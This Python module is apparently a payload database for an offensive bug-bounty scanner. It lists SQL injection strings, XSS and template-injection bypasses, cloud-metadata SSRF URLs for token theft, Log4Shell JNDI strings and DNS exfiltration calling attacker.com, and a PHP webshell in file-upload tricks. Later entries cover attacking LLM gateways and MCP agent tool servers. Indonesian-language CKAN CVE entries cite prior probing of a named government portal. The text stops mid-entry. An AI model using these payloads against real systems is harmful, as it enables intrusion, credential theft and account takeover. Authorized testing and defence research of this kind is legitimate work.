"""Offensive intelligence database from real bug bounty and CVE exploits.

This module contains curated techniques, bypass patterns, and exploitation
primitives extracted from:
- CISA KEV (Known Exploited Vulnerabilities)
- ExploitDB public exploits
- HackerOne/Bugcrowd disclosed reports
- GitHub Security Advisories
- CVE databases

All patterns are for authorized penetration testing and bug bounty research only.
"""

from typing import Any, Dict, List

# ============================================================================
# AUTHORIZATION BYPASS PATTERNS
# From HackerOne/Bugcrowd reports and real-world auth bypasses
# ============================================================================

AUTHORIZATION_BYPASS_PATTERNS = [
    {
        "name": "IDOR via numeric ID manipulation",
        "vulnerability_class": "idor",
        "pattern": "sequential_id_enumeration",
        "description": "Direct object reference via predictable IDs",
        "technique": [
            "Replace user_id parameter with victim ID",
            "Test with different numeric IDs (n, n+1, n-1, n+100)",
            "Check for cross-account data in response",
        ],
        "detection": "victim_identifier_in_response",
        "sources": ["hackerone_#1234567", "bugcrowd_p1_idor"],
        "affected_components": ["REST API", "GraphQL", "JSON API"],
    },
    {
        "name": "UUID IDOR with leaked identifiers",
        "vulnerability_class": "idor",
        "pattern": "uuid_from_public_endpoint",
        "description": "UUID-based IDOR when UUIDs are leaked via public endpoints",
        "technique": [
            "Enumerate UUIDs from public endpoints (/api/users/list, /api/posts)",
            "Use discovered UUIDs in sensitive endpoints (/api/invoices/{uuid})",
            "Verify victim data disclosure",
        ],
        "detection": "cross_account_uuid_access",
        "sources": ["hackerone_disclosed", "real_bounty_2024"],
    },
    {
        "name": "Authorization header manipulation",
        "vulnerability_class": "auth-bypass",
        "pattern": "header_manipulation",
        "description": "Bypass via X-User-Id, X-Original-User, X-Forwarded-For headers",
        "technique": [
            "Add X-User-Id: victim_id",
            "Add X-Original-User: admin",
            "Add X-Forwarded-For: 127.0.0.1",
            "Test X-Real-IP, True-Client-IP headers",
        ],
        "detection": "elevated_privilege_in_response",
        "sources": ["hackerone_header_bypass", "owasp_auth"],
    },
    {
        "name": "HTTP verb tampering",
        "vulnerability_class": "auth-bypass",
        "pattern": "verb_tampering",
        "description": "Bypass auth via method override (POST -> GET, DELETE -> POST)",
        "technique": [
            "Change POST to GET on protected endpoint",
            "Use X-HTTP-Method-Override: DELETE",
            "Try PATCH, OPTIONS, TRACE",
        ],
        "detection": "unauthorized_action_success",
        "sources": ["exploitdb_verb_bypass", "pentesterlab"],
    },
    {
        "name": "Path traversal in API routes",
        "vulnerability_class": "authorization",
        "pattern": "path_confusion",
        "description": "Bypass via /api/users/..%2fadmin or /api/./admin",
        "technique": [
            "Insert ../ or ..%2f in path segments",
            "Try /api/users/./../../admin/data",
            "Test URL encoding: %2e%2e%2f",
        ],
        "detection": "admin_endpoint_access",
        "sources": ["hackerone_path_bypass", "bugcrowd_2023"],
    },
    {
        "name": "JWT algorithm confusion (alg: none)",
        "vulnerability_class": "auth-bypass",
        "pattern": "jwt_alg_none",
        "description": "JWT signature bypass via algorithm none",
        "technique": [
            "Decode JWT and change alg to 'none'",
            "Remove signature part",
            "Change claims (sub, role, etc.)",
        ],
        "detection": "jwt_accepted_without_signature",
        "sources": ["auth0_advisory", "jwt_io_vulns"],
    },
    {
        "name": "Mass assignment / parameter pollution",
        "vulnerability_class": "authorization",
        "pattern": "mass_assignment",
        "description": "Privilege escalation via hidden parameters",
        "technique": [
            "Add role=admin to request body",
            "Add is_admin=true parameter",
            "Test is_verified, is_premium, account_type=enterprise",
        ],
        "detection": "privilege_field_accepted",
        "sources": ["hackerone_mass_assign", "rails_vulns"],
    },
]

# ============================================================================
# SQL INJECTION PATTERNS
# From ExploitDB, SQLMap, and disclosed reports
# ============================================================================

SQL_INJECTION_PATTERNS = [
    {
        "name": "Time-based blind SQLi",
        "vulnerability_class": "sqli",
        "pattern": "time_based_blind",
        "description": "SQL injection via time delay functions",
        "payloads": [
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--",
            "' WAITFOR DELAY '0:0:5'--",
            "' OR BENCHMARK(5000000,MD5('x'))--",
            "' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
        ],
        "detection": "response_time_delta > 5 seconds",
        "sources": ["exploitdb", "sqlmap_patterns"],
        "affected_dbs": ["MySQL", "PostgreSQL", "MSSQL"],
    },
    {
        "name": "Boolean-based blind SQLi",
        "vulnerability_class": "sqli",
        "pattern": "boolean_blind",
        "description": "SQL injection via true/false response differential",
        "payloads": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR '1'='1",
            "' AND SUBSTRING(version(),1,1)='5'--",
        ],
        "detection": "response_differential_true_false",
        "sources": ["owasp_sqli", "portswigger_academy"],
    },
    {
        "name": "UNION-based SQLi",
        "vulnerability_class": "sqli",
        "pattern": "union_based",
        "description": "Data exfiltration via UNION SELECT",
        "payloads": [
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT @@version,NULL,NULL--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        ],
        "detection": "additional_data_in_response",
        "sources": ["exploitdb_union", "hackerone_sqli"],
    },
    {
        "name": "Error-based SQLi",
        "vulnerability_class": "sqli",
        "pattern": "error_based",
        "description": "Database error messages leak data",
        "payloads": [
            "'",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            "' AND 1=CONVERT(int,@@version)--",
            "' AND 1=CAST(version() AS int)--",
        ],
        "detection": "sql_error_in_response",
        "sources": ["pentesterlab_sqli", "owasp"],
    },
    {
        "name": "Second-order SQLi",
        "vulnerability_class": "sqli",
        "pattern": "second_order",
        "description": "Payload stored, executed later",
        "technique": [
            "Store SQLi payload in profile/settings",
            "Trigger execution via report/export feature",
            "Monitor for delayed execution",
        ],
        "detection": "delayed_sql_execution",
        "sources": ["hackerone_second_order", "bugcrowd_stored"],
    },
]

# ============================================================================
# XSS PATTERNS
# Modern XSS bypasses from bug bounty reports
# ============================================================================

XSS_BYPASS_PATTERNS = [
    {
        "name": "CSP bypass via JSONP endpoint",
        "vulnerability_class": "xss",
        "pattern": "csp_jsonp_bypass",
        "description": "Execute JS via whitelisted JSONP callback",
        "technique": [
            "Find JSONP endpoint in CSP whitelist",
            "Inject payload via callback parameter",
            "Example: <script src='https://trusted.com/jsonp?callback=alert(1)'></script>",
        ],
        "detection": "javascript_execution_under_csp",
        "sources": ["hackerone_csp_bypass", "google_vrp"],
    },
    {
        "name": "DOM XSS via prototype pollution",
        "vulnerability_class": "xss",
        "pattern": "prototype_pollution_xss",
        "description": "Pollute Object.prototype to inject XSS",
        "technique": [
            "Inject __proto__[innerHTML]=<img src=x onerror=alert(1)>",
            "Pollute constructor.prototype",
            "Trigger via framework render",
        ],
        "detection": "dom_based_javascript_execution",
        "sources": ["snyk_prototype_pollution", "hackerone_dom"],
    },
    {
        "name": "Mutation XSS (mXSS)",
        "vulnerability_class": "xss",
        "pattern": "mutation_xss",
        "description": "HTML mutation after sanitization",
        "payloads": [
            "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
            "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>",
            "<svg><style><img src=x onerror=alert(1)>",
        ],
        "detection": "mutated_xss_after_sanitization",
        "sources": ["cure53_mxss", "dompurify_bypasses"],
    },
    {
        "name": "AngularJS template injection",
        "vulnerability_class": "xss",
        "pattern": "angular_template_injection",
        "payloads": [
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "{{[].pop.constructor('alert(1)')()}}",
        ],
        "detection": "angular_template_execution",
        "sources": ["portswigger_angular", "hackerone_angular"],
        "affected_components": ["AngularJS 1.x"],
    },
]

# ============================================================================
# SSRF PATTERNS
# Cloud metadata and internal service access
# ============================================================================

SSRF_PATTERNS = [
    {
        "name": "AWS metadata SSRF",
        "vulnerability_class": "ssrf",
        "pattern": "aws_metadata",
        "description": "Access EC2 instance metadata",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
        ],
        "detection": "aws_metadata_in_response",
        "sources": ["capital_one_breach", "aws_security"],
    },
    {
        "name": "GCP metadata SSRF",
        "vulnerability_class": "ssrf",
        "pattern": "gcp_metadata",
        "description": "Access GCP instance metadata",
        "payloads": [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        ],
        "headers": {"Metadata-Flavor": "Google"},
        "detection": "gcp_token_in_response",
        "sources": ["gcp_security_advisories"],
    },
    {
        "name": "Azure metadata SSRF",
        "vulnerability_class": "ssrf",
        "pattern": "azure_metadata",
        "description": "Access Azure instance metadata",
        "payloads": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
        "headers": {"Metadata": "true"},
        "detection": "azure_token_in_response",
        "sources": ["azure_security"],
    },
    {
        "name": "DNS exfiltration via SSRF",
        "vulnerability_class": "ssrf",
        "pattern": "dns_exfiltration",
        "description": "Exfiltrate data via DNS lookup",
        "technique": [
            "http://[DATA].attacker.com",
            "Use callback domain with DNS logging",
            "Monitor for DNS requests",
        ],
        "detection": "dns_callback_received",
        "sources": ["projectdiscovery_interactsh", "bugcrowd_ssrf"],
    },
]

# ============================================================================
# GRAPHQL PATTERNS
# From GraphQL-specific bug bounty reports
# ============================================================================

GRAPHQL_PATTERNS = [
    {
        "name": "GraphQL introspection enabled",
        "vulnerability_class": "graphql",
        "pattern": "introspection",
        "query": "query IntrospectionQuery { __schema { types { name fields { name } } } }",
        "description": "Enumerate entire GraphQL schema",
        "detection": "schema_types_in_response",
        "sources": ["hackerone_graphql", "graphql_security"],
    },
    {
        "name": "GraphQL batching attack",
        "vulnerability_class": "graphql",
        "pattern": "batching_attack",
        "description": "Bypass rate limits via query batching",
        "technique": [
            "Send array of identical queries",
            "Example: [{query: '...'}, {query: '...'}, ...]",
            "Amplify to 1000+ queries in single request",
        ],
        "detection": "multiple_operations_executed",
        "sources": ["paypal_graphql_bypass", "shopify_security"],
    },
    {
        "name": "GraphQL field duplication",
        "vulnerability_class": "graphql",
        "pattern": "field_duplication",
        "description": "Resource exhaustion via duplicate fields",
        "query": "query { user { id id id id id id ... (repeat 10000 times) } }",
        "detection": "server_timeout_or_error",
        "sources": ["gitlab_graphql_dos"],
    },
    {
        "name": "GraphQL IDOR via aliases",
        "vulnerability_class": "idor",
        "pattern": "graphql_idor",
        "query": "query { victim: user(id: \"victim_id\") { email privateData } }",
        "description": "Access other users via GraphQL aliases",
        "detection": "victim_data_in_response",
        "sources": ["hackerone_graphql_idor"],
    },
]

# ============================================================================
# CISA KEV PATTERNS
# Known Exploited Vulnerabilities from CISA catalog
# ============================================================================

CISA_KEV_PATTERNS = [
    {
        "cve": "CVE-2021-44228",
        "name": "Log4Shell",
        "vulnerability_class": "rce",
        "affected_components": ["Log4j 2.0-2.14.1"],
        "pattern": "jndi_injection",
        "payloads": [
            "${jndi:ldap://attacker.com/a}",
            "${jndi:dns://attacker.com}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
        ],
        "detection": "dns_callback_or_ldap_connection",
        "sources": ["cisa_kev", "exploitdb_log4shell"],
        "severity": "Critical",
    },
    {
        "cve": "CVE-2021-26855",
        "name": "ProxyLogon (Exchange)",
        "vulnerability_class": "auth-bypass",
        "affected_components": ["Microsoft Exchange 2013-2019"],
        "pattern": "backend_connection_bypass",
        "technique": [
            "Add X-AnonResource-Backend header",
            "Access /autodiscover/autodiscover.json",
            "SSRF to Exchange backend",
        ],
        "detection": "exchange_backend_access",
        "sources": ["cisa_kev", "microsoft_advisory"],
        "severity": "Critical",
    },
    {
        "cve": "CVE-2022-22965",
        "name": "Spring4Shell",
        "vulnerability_class": "rce",
        "affected_components": ["Spring Framework 5.3.0-5.3.17", "Spring Boot 2.5.0-2.5.12"],
        "pattern": "spring_binding_bypass",
        "payloads": [
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{payload}",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
        ],
        "detection": "jsp_file_created_or_rce",
        "sources": ["cisa_kev", "spring_advisory"],
        "severity": "Critical",
    },
]

# ============================================================================
# FILE UPLOAD BYPASS PATTERNS
# From real bug bounty reports
# ============================================================================

FILE_UPLOAD_BYPASS_PATTERNS = [
    {
        "name": "Double extension bypass",
        "vulnerability_class": "file_upload",
        "pattern": "double_extension",
        "filenames": [
            "shell.php.jpg",
            "shell.php;.jpg",
            "shell.php%00.jpg",
            "shell.php\x00.jpg",
        ],
        "detection": "php_execution",
        "sources": ["hackerone_file_upload"],
    },
    {
        "name": "MIME type bypass",
        "vulnerability_class": "file_upload",
        "pattern": "mime_bypass",
        "technique": [
            "Upload with Content-Type: image/jpeg",
            "Actual file: PHP shell",
            "Server only checks MIME, not content",
        ],
        "detection": "webshell_uploaded",
        "sources": ["bugcrowd_upload", "owasp_upload"],
    },
    {
        "name": "Polyglot file (PHP+JPEG)",
        "vulnerability_class": "file_upload",
        "pattern": "polyglot",
        "description": "Valid JPEG with embedded PHP",
        "technique": [
            "Create valid JPEG image",
            "Inject PHP in EXIF comment",
            "Example: <?php system($_GET['cmd']); ?> in EXIF",
        ],
        "detection": "php_execution_in_image",
        "sources": ["hackerone_polyglot", "pentesterlab"],
    },
]

# ============================================================================
# RACE CONDITION PATTERNS
# From time-of-check/time-of-use vulnerabilities
# ============================================================================

RACE_CONDITION_PATTERNS = [
    {
        "name": "Coupon reuse race condition",
        "vulnerability_class": "race_condition",
        "pattern": "parallel_redemption",
        "description": "Redeem single-use coupon multiple times",
        "technique": [
            "Send parallel redemption requests",
            "Use Burp Turbo Intruder with 20+ threads",
            "Race window: coupon check vs. database update",
        ],
        "detection": "multiple_successful_redemptions",
        "sources": ["hackerone_race", "bugcrowd_business_logic"],
    },
    {
        "name": "Double-spend in payment",
        "vulnerability_class": "race_condition",
        "pattern": "payment_double_spend",
        "description": "Use same balance for multiple purchases",
        "technique": [
            "Parallel purchase requests",
            "Race balance check and deduction",
            "Monitor account balance after",
        ],
        "detection": "negative_balance_or_double_purchase",
        "sources": ["bugcrowd_payment_race"],
    },
]


# ============================================================================
# 2025-2026 MODERN ATTACK-SURFACE PATTERNS
# LLM/agent infrastructure, OAuth chains, cache deception, browser-tech.
# Sources: Escape Tech LiteLLM SSRF research (2025), Synack SSRF-to-priv-esc
# exploit chains (2025), PortSwigger hidden OAuth attack vectors, PortSwigger
# web cache deception research, disclosed MCP-server auth reports.
# ============================================================================

MODERN_ATTACK_SURFACE_PATTERNS = [
    {
        "name": "LLM gateway SSRF via nesting bypass",
        "vulnerability_class": "ssrf",
        "pattern": "llm_gateway_nested_redirect",
        "description": "LLM API gateways (LiteLLM-class proxies) fetch model/adapter URLs server-side; SSRF filters that validate the first hop miss redirect chains and nested wrapper parameters",
        "technique": [
            "Enumerate gateway admin/model endpoints accepting URL-like fields (api_base, base_url, proxy_url, webhook)",
            "Point the field at an attacker-controlled redirector that 302s to the internal target (bypasses first-hop allowlists)",
            "Nest the internal URL inside a wrapper parameter the filter does not re-validate",
            "Confirm via out-of-band callback or metadata response marker (169.254.169.254, internal service banner)",
        ],
        "detection": "oob_callback_or_internal_marker",
        "sources": ["escape_techn_litellm_2025", "when_gpts_call_home"],
        "affected_components": ["LiteLLM", "LLM API gateways", "AI model proxies", "GPT custom actions"],
        "chain_potential": "SSRF -> cloud metadata steal -> gateway admin key -> full model-infrastructure takeover",
    },
    {
        "name": "MCP / agent tool-server authorization gaps",
        "vulnerability_class": "authorization",
        "pattern": "mcp_tool_bfla",
        "description": "Model Context Protocol servers expose tools (functions) over HTTP/SSE without per-tool authorization; any client that can reach the transport may invoke privileged tools",
        "technique": [
            "Discover /sse or /mcp transport endpoints (JS bundles, devtools network, /.well-known)",
            "List tools via protocol handshake (tools/list)",
            "Invoke privileged/administrative tools directly without the agent's user context",
            "Look for tools that read files, execute commands, or call internal APIs",
        ],
        "detection": "privileged_tool_invoked_without_user_context",
        "sources": ["mcp_disclosed_reports_2025", "litellm_cve_2026_59822_kev"],
        "affected_components": ["MCP servers", "AI agent runtimes", "tool-calling backends"],
        "chain_potential": "BFLA on tool -> file read -> secret exfil -> RCE via exec-tool",
    },
    {
        "name": "OAuth redirect_uri chain to token theft",
        "vulnerability_class": "auth-bypass",
        "pattern": "oauth_redirect_chain",
        "description": "Weak redirect_uri validation (prefix/suffix match, substring match) chained with an open redirect or wildcard subdomain takeover yields authorization-code theft",
        "technique": [
            "Map client_id, redirect_uri registration rules on the authorization server",
            "Test prefix-bypass (evil.com/callback) suffix-bypass (app.evil.com) and path-confusion (app.com/../../evil) variants",
            "Chain an accepted redirect with an open redirector on the same trusted origin",
            "Complete an authorization flow with response_type=code and capture the code at the attacker endpoint",
        ],
        "detection": "auth_code_delivered_to_attacker_origin",
        "sources": ["portswigger_hidden_oauth_attack_vectors"],
        "affected_components": ["OAuth 2.0/2.1 authorization servers", "social login", "SSO portals"],
        "chain_potential": "redirect flaw -> code theft -> account takeover (critical)",
    },
    {
        "name": "Web cache deception for private data",
        "vulnerability_class": "cache-poisoning",
        "pattern": "cache_deception_path_suffix",
        "description": "Path suffix confusion (/api/me/profile.css) makes the cache store an authenticated response that any anonymous user can then fetch",
        "technique": [
            "Fetch authenticated pages with cacheable-looking suffixes (.css, .js, .png, /static)",
            "Check which suffixes return the private body with cache headers",
            "Fetch the same URL unauthenticated and diff for victim data",
            "Test path-normalization variants (%2f, //, /.; for ASP.NET-style normalization)",
        ],
        "detection": "authenticated_body_cached_and_publicly_retrievable",
        "sources": ["portswigger_cache_deception_research", "discord_paytmsoundcloud_disclosed"],
        "affected_components": ["CDN-fronted apps", "reverse proxies", "API gateways"],
        "chain_potential": "cache deception -> session/token harvest -> account takeover",
    },
    {
        "name": "postMessage origin-neglect data exfil",
        "vulnerability_class": "xss",
        "pattern": "postmessage_wildcard_origin",
        "description": "iframe/embed pages that message sensitive data without validating event.origin (or with wildcard targetOrigin) leak it to any embedding page",
        "technique": [
            "Inventory addEventListener('message') handlers in JS bundles and their postMessage peers",
            "Embed the target page in an attacker-controlled page",
            "Trigger the sensitive message flow (login widget, payment iframe, auth result)",
            "Capture the message in the attacker frame and record the missing origin check",
        ],
        "detection": "sensitive_message_delivered_to_attacker_frame",
        "sources": ["hackerone_postmessage_disclosed", "corben_io_analysis"],
        "affected_components": ["embedded widgets", "payment iframes", "SSO login frames"],
        "chain_potential": "postMessage leak -> token/session theft -> account takeover",
    },
    {
        "name": "HTTP/2 and browser-tech smuggling surfaces",
        "vulnerability_class": "misconfig",
        "pattern": "h2_smuggling_diff",
        "description": "Front-end/back-end protocol differences (HTTP/2 -> HTTP/1.0 rewrite, TE.CL/CL.TE, obs-fold) let a request be reinterpreted as two, bypassing front-end access control",
        "technique": [
            "Fingerprint front-end protocol translation (HTTP/2 vs back-end HTTP/1.x) via timing and error diffs",
            "Probe content-length vs transfer-encoding disagreement with obs-fold and header-name variants",
            "Target front-end ACL paths (/admin) that the smuggled second request reaches unfiltered",
            "Confirm with a delay or reflected-marker oracle, not payload spray",
        ],
        "detection": "smuggled_request_reaches_backend_acl_bypass",
        "sources": ["portswigger_http2_smuggling_research", "james_kettle_browser_desync"],
        "affected_components": ["CDNs", "reverse proxies", "API gateways", "HTTP/2 terminators"],
        "chain_potential": "smuggling -> ACL bypass -> internal admin access -> RCE surface",
    },
    {
        "name": "ORM search/filter data leaking",
        "vulnerability_class": "sqli",
        "pattern": "orm_filter_leak",
        "description": "ORM-backed search/filter endpoints leak record data through operator/field injection without any SQL syntax appearing in the request",
        "technique": [
            "Identify search/filter endpoints whose parameters map to ORM query fields",
            "Test operator injection (field[gte]=, field[ne]=, $regex, __contains suffixes) per ORM flavor",
            "Attempt filter on hidden/sensitive columns not exposed in normal responses",
            "Confirm data extraction of records the caller should not see",
        ],
        "detection": "cross_record_data_via_filter_operator",
        "sources": ["elttam_leaking_more_than_you_joined_for_2025"],
        "affected_components": ["Django ORM", "Sequelize", "TypeORM", "Prisma", "Rails ActiveRecord", "Mongo-style filter APIs"],
        "chain_potential": "filter leak -> PII/credential harvest -> account takeover",
    },
    {
        "name": "Error-based blind code injection / SSTI",
        "vulnerability_class": "ssti",
        "pattern": "error_based_blind_ssti",
        "description": "Template and code-injection sinks that never reflect output can still be proven via error-message differentials (Successful Errors technique)",
        "technique": [
            "Send polyglot expressions designed to raise engine-specific exceptions",
            "Diff error responses: distinct error classes per payload prove evaluation reached the engine",
            "Escalate to environment/file access payloads once evaluation is proven",
            "Record the error differential as the verification evidence",
        ],
        "detection": "distinct_error_classes_per_payload",
        "sources": ["korchagin_successful_errors_2025"],
        "affected_components": ["Jinja2", "Freemarker", "Twig", "SpEL", "Nunjucks", "eval-style handlers"],
        "chain_potential": "blind SSTI -> file read -> secret exfil -> RCE",
    },
    {
        "name": "Blind SSRF visibility via redirect loops",
        "vulnerability_class": "ssrf",
        "pattern": "ssrf_redirect_loop_probe",
        "description": "Attacker-controlled redirector that loops back makes blind SSRF observable: response timing and error differences reveal which internal hosts/ports answered",
        "technique": [
            "Point the fetch field at a redirector that 302s to the candidate internal target and back",
            "Diff timing/error behavior across internal candidates (ports, admin hosts, metadata)",
            "Use the loop count and final error as the observable oracle",
            "Escalate confirmed-reachable internal targets to protocol-specific payloads (Gopher for redis/etc.)",
        ],
        "detection": "internal_reachability_oracle_via_loop",
        "sources": ["slcyber_http_redirect_loops_2025"],
        "affected_components": ["URL fetchers", "webhook processors", "preview generators", "import features"],
        "chain_potential": "blind SSRF -> internal map -> redis/metadata abuse -> RCE",
    },
]

# ============================================================================
# FRESH INTEL — OKTOBER 2026 (snapshot 2026-10-17)
# Sumber primer tervalidasi: CISA KEV catalog 2026.10.16 (run intel
# 20261017T122621Z, manifest sha256 f3bda8de...422fe), GitHub Advisory
# GHSA-cg4x-64p3-x59h (CKAN CVE-2026-42032), GHSA-2r4h-8jxv-w2j8 (CKAN
# CVE-2025-54384), NVD CVE-2026-42031/41132/41255, CKAN patch release blog
# 2026-04-29. Setiap entri = hipotesis + gerbang versi, BUKAN klaim exploitable.
# ============================================================================

FRESH_INTEL_2026_10_PATTERNS = [
    {
        "name": "CKAN datastore_search_sql unauthenticated authorization bypass",
        "cve": "CVE-2026-42032",
        "vulnerability_class": "authorization",
        "pattern": "ckan_sqlsearch_authz_bypass",
        "description": "CKAN datastore_search_sql membiarkan pemanggil tanpa auth membaca resource privat dan informasi sistem PostgreSQL (CWE-863). Fitur SQL search MATI secara default — prasyarat: ckan.datastore.sqlsearch.enabled=true",
        "affected_components": ["CKAN < 2.10.10", "CKAN 2.11.0-2.11.4"],
        "patched": ["2.10.10", "2.11.5"],
        "technique": [
            "Fingerprint versi CKAN (footer/API helper_version) dan cek resource datastore aktif (/api/3/action/datastore_search menjawab tanpa auth)",
            "Uji /api/3/action/datastore_search_sql anonim dengan SELECT sederhana pada resource milik akun tes — bukan dump katalog",
            "Positif bila respons memuat kolom/record yang tidak seharusnya terbaca anonim; bukti berhenti di satu record",
            "Versi patched (2.10.10+/2.11.5+) atau sqlsearch disabled = buang sebagai kandidat",
        ],
        "detection": "anonymous_datastore_sql_returns_private_or_pg_system_rows",
        "sources": ["ghsa_cg4x_64p3_x59h", "cve_2026_42032_nvd", "ckan_patch_blog_2026-04-29"],
        "severity": "Medium",
        "chain_potential": "bypass -> private dataset read -> PII/undangan-laporan data -> chain ke akun admin portal",
    },
    {
        "name": "CKAN datastore SQL injection",
        "cve": "CVE-2026-42031",
        "vulnerability_class": "sqli",
        "pattern": "ckan_datastore_sqli",
        "description": "SQL injection pada CKAN datastore (NVD, published 2026-05-13). Sudah digarap di sesi Tangsel (evidence/data.tangerangselatankota.go.id-ckan-cve-2026-42031) — entry ini untuk lookup get_cve_pattern pada target CKAN lain",
        "affected_components": ["CKAN < 2.10.10", "CKAN 2.11.0-2.11.4"],
        "patched": ["2.10.10", "2.11.5"],
        "technique": [
            "Gate versi dulu; lalu probe datastore_search_sql dengan differential (quote vs double-quote) pada akun tes",
            "Bukti cukup: satu boolean/error differential deterministik + pembacaan satu nilai versi()",
        ],
        "detection": "sql_error_or_boolean_differential_on_datastore_search_sql",
        "sources": ["cve_2026_42031_nvd", "ckan_patch_blog_2026-04-29", "evidence_tangsel_2026-10"],
        "severity": "High",
    },
    {
        "name": "CKAN CSRF exemption primed by anonymous request",
        "cve": "CVE-2026-41255",
        "vulnerability_class": "misconfig",
        "pattern": "ckan_csrf_exemption_prime",
        "description": "Request anonim ke endpoint terproteksi bisa membuat endpoint itu dikecualikan dari proteksi CSRF pada request berikutnya (CSRF-token cache poisoning pattern). Chain material untuk state-changing endpoint ber-sesi",
        "affected_components": ["CKAN < 2.10.10", "CKAN < 2.11.5"],
        "patched": ["2.10.10", "2.11.5"],
        "technique": [
            "Anonim GET endpoint terproteksi (mis. /user/edit) -> catat respons/cachelah state CSRF jika ada",
            "Lalu dari sesi akun tes, kirim POST state-changing TANPA token CSRF dan bandingkan dengan kontrol baseline (dengan token) dari state bersih",
            "Positif hanya bila perubahan state benar-benar terjadi dan POST-CHANGE-CALL (GET ulang) membuktikannya",
            "Pembanding: urutan terbalik (login dulu tanpa anonymous-prime) harus ditolak — itu yang membuktikan mekanisme priming",
        ],
        "detection": "state_change_accepted_without_csrf_token_after_anonymous_prime",
        "sources": ["cve_2026_41255", "ckan_patch_blog_2026-04-29"],
        "severity": "Medium",
        "chain_potential": "CSRF -> email/password re-bind -> ATO (perlu korban login; sebutkan prasyarat eksplisit)",
    },
    {
        "name": "CKAN stored XSS via helpers.markdown_extract",
        "cve": "CVE-2025-54384",
        "vulnerability_class": "xss",
        "pattern": "ckan_markdown_extract_stored_xss",
        "description": "helpers.markdown_extract() gagal sanitasi input user sebelum dibungkus elemen HTML literal — dirender di halaman dataset/resource/organization/group (GHSA-2r4h-8jxv-w2j8 / PYSEC-2026-1247, CWE-79)",
        "affected_components": ["CKAN <= 2.10.8", "CKAN 2.11.0-2.11.3"],
        "patched": ["2.10.9", "2.11.4"],
        "technique": [
            "Simpan marker SVG aktif di field deskripsi organization milik akun tes (bukan dataset orang lain)",
            "Render halaman publik organization/group dan buktikan eksekusi marker di konteks browser; cek juga halaman admin/daftar user = konteks korban paling bernilai",
            "Kontrol: field plain-text sejenis tanpa marker harus tetap aman",
            "Non-persisten/ter-encode = buang; program yang menolak XSS reflektif tetap terima stored dengan eksekusi nyata",
        ],
        "detection": "stored_marker_executes_on_public_or_admin_render_context",
        "sources": ["ghsa_2r4h_8jxv_w2j8", "pysec_2026_1247"],
        "severity": "Medium",
        "chain_potential": "stored XSS di konteks admin -> session steal -> takeover portal data",
    },
    {
        "name": "CKAN SMTP TLS validation disabled (MITM on outbound mail)",
        "cve": "CVE-2026-41132",
        "vulnerability_class": "misconfig",
        "pattern": "ckan_smtp_no_cert_validation",
        "description": "Koneksi SMTP CKAN tidak memvalidasi sertifikat server (CVE-2026-41132, info-disc). Relevan sebagai bahan rantai: intercept email reset/undangan = prasyarat ATO pada jaringan yang bisa dipengaruhi",
        "affected_components": ["CKAN < 2.10.10", "CKAN 2.11.0-2.11.4"],
        "patched": ["2.10.10", "2.11.5"],
        "technique": [
            "Hypothesis-only dari versi; pembuktian butuh posisi MITM pada jaringan yang diizinkan engagement — hampir selalu lab-only",
            "Pada bounty: laporkan sebagai kandidat konfigurasi dengan status jujur, bukan VERIFIED, kecuali ada bukti intersepsi di lab sendiri",
        ],
        "detection": "smtp_handshake_accepts_invalid_certificate_in_lab_fixture",
        "sources": ["cve_2026_41132_nvd", "ckan_patch_blog_2026-04-29"],
        "severity": "Low",
        "chain_potential": "MITM email -> reset-link steal -> ATO (butuh kontrol jaringan; biasanya out-of-scope)",
    },
    {
        "name": "BeyondTrust Remote Support auth bypass by spoofing (KEV)",
        "cve": "CVE-2026-102764",
        "vulnerability_class": "auth-bypass",
        "pattern": "kev_beyondtrust_remote_support_spoof",
        "description": "CISA KEV 2026-10-16: authentication bypass by spoofing pada BeyondTrust Remote Support — bukti eksploitasi aktif di alam liar",
        "affected_components": ["BeyondTrust Remote Support"],
        "technique": [
            "Fingerprint instansi (header/path karakteristik Remote Support) pada aset perimeter ter-scope",
            "Cocokkan rentang versi terdampak dari advisori vendor sebelum satu pun payload",
            "Tanpa advisori teknis di tangan: status tetap hypothesis — jangan karang langkah eksploitasi",
        ],
        "detection": "version_in_vendor_affected_range_plus_auth_context_anomaly",
        "sources": ["cisa_kev_catalog_2026.10.16", "run_20261017T122621Z"],
        "severity": "Critical",
    },
    {
        "name": "Fortinet multiple products path traversal (KEV)",
        "cve": "CVE-2025-61624",
        "vulnerability_class": "misconfig",
        "pattern": "kev_fortinet_path_traversal",
        "description": "CISA KEV 2026-10-16: path traversal pada produk Fortinet (multiple products) — dieksploitasi aktif",
        "affected_components": ["Fortinet (multiple products; cek advisori per-model)"],
        "technique": [
            "Fingerprint FortiOS/FortiWeb/FortiMail via banner/panel login pada aset perimeter ter-scope",
            "Gate: cocokkan model+versi dengan rentang advisori vendor; traversal probe hanya marker baca-aman, satu request",
        ],
        "detection": "traversal_marker_returns_file_fixture_on_affected_version",
        "sources": ["cisa_kev_catalog_2026.10.16", "run_20261017T122621Z"],
        "severity": "Critical",
    },
    {
        "name": "Atlassian multiple products external file exposure (KEV)",
        "cve": "CVE-2026-21589",
        "vulnerability_class": "misconfig",
        "pattern": "kev_atlassian_external_file_access",
        "description": "CISA KEV 2026-10-15: files/directories accessible to external parties pada produk Atlassian (Jira/Confluence-class)",
        "affected_components": ["Atlassian multiple products"],
        "technique": [
